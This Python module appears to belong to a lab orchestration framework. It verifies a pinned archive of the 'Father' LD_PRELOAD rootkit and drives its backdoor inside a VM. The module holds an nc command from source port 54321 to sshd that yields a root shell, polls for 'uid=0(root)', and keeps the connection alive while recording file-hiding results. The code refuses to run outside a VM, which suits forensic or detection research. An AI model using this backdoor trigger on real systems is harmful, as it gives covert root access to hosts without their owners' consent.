"""Father-only source verification and native backdoor coordination."""

import re
import shlex
import shutil
import subprocess
import time
from pathlib import Path

import yaml

from orchestrator.core.provenance import excerpt, file_sha256
from orchestrator.scenarios.engine import ScenarioStepError
from orchestrator.scenarios.executors import SSHClientExecutor


ROOT = Path(__file__).resolve().parent
ARCHIVE = ROOT / "files/father-upstream-4eb2712.tar"
LOCK = ROOT / "father.lock.yml"
BACKDOOR_CLIENT = ROOT / "files/verify_backdoor.sh"


def _require_vm(ctx):
    if not isinstance(ctx.executor, SSHClientExecutor):
        raise RuntimeError(
            "userland_father_ldpreload requires the VM-backed SSH executor; "
            "local execution is refused"
        )


def verify_father_source(ctx, _step):
    _require_vm(ctx)
    if shutil.which("nc") is None:
        raise RuntimeError("Father backdoor validation requires host OpenBSD nc")
    lock = yaml.safe_load(LOCK.read_text(encoding="utf-8"))
    archive_hash = file_sha256(ARCHIVE)
    expected_hash = lock["retrieval"]["archive_sha256"]
    if archive_hash != expected_hash:
        raise RuntimeError(
            f"Father archive SHA-256 mismatch: expected {expected_hash}, "
            f"got {archive_hash}"
        )
    return {
        "record_type": "source_provenance",
        "repository": lock["upstream"]["url"],
        "commit": lock["upstream"]["pinned_commit"],
        "archive_sha256": archive_hash,
    }


def _record_facts(ctx, match, response_name):
    root = ctx.parameters["root"].rstrip("/")
    ctx.record_scenario_facts(
        {
            "installed_library_path": ctx.parameters["installed_library_path"],
            "preload_config_path": ctx.parameters["preload_config_path"],
            "affected_pids": [int(value) for value in match.groups()[:3]],
            "sshd_pid": int(match.group(4)),
            "marker_path": f"{root}/probe/__malicious_file",
            "hiding_before_output_path": f"{root}/probe/before.txt",
            "hiding_after_output_path": f"{root}/probe/after.txt",
            "file_hiding_passed": True,
            "father_backdoor_passed": True,
            "source_port": 54321,
            "destination_service": "sshd",
            "destination_port": ctx.executor.port,
            "backdoor_response_path": response_name,
            "connection_left_active": True,
        }
    )


def run_father_calibration(ctx, _step):
    _require_vm(ctx)
    match = re.search(
        r"FATHER_RESULT pids=(\d+),(\d+),(\d+) sshd_pid=(\d+)",
        ctx.step_outputs["run_guest_script"],
    )
    if match is None:
        raise RuntimeError("Father guest script returned no validated process IDs")

    response_path = ctx.out_dir / "father_backdoor_response.txt"
    client_args = [
        "bash",
        str(BACKDOOR_CLIENT),
        str(response_path),
        ctx.executor.host,
        str(ctx.executor.port),
    ]
    details = {
        "record_type": "host_backdoor",
        "command": shlex.join(client_args),
        "netcat_command": shlex.join(
            ["nc", "-4", "-n", "-p", "54321", ctx.executor.host, str(ctx.executor.port)]
        ),
        "source_port": 54321,
        "destination_service": "sshd",
        "destination_port": ctx.executor.port,
        "response_path": response_path.name,
    }
    response_path.write_bytes(b"")
    client = subprocess.Popen(client_args)
    deadline = time.monotonic() + 12
    response = ""
    while time.monotonic() < deadline:
        response = response_path.read_text(encoding="utf-8", errors="replace")
        if "uid=0(root)" in response and "gid=1337" in response:
            break
        if client.poll() is not None:
            break
        time.sleep(0.2)
    if (
        "uid=0(root)" not in response
        or "gid=1337" not in response
        or client.poll() is not None
    ):
        if client.poll() is None:
            client.terminate()
        details.update(status="failure", response_excerpt=excerpt(response))
        raise ScenarioStepError(
            "Father backdoor did not return a live root shell", metadata=details
        )

    details.update(
        status="success",
        client_pid=client.pid,
        id_response="uid=0(root), gid=1337",
        connection_left_active=True,
        response_excerpt=excerpt(response),
    )
    # RunContext remains alive through acquisition, retaining the client.
    ctx._father_backdoor_client = client
    _record_facts(ctx, match, response_path.name)
    return details
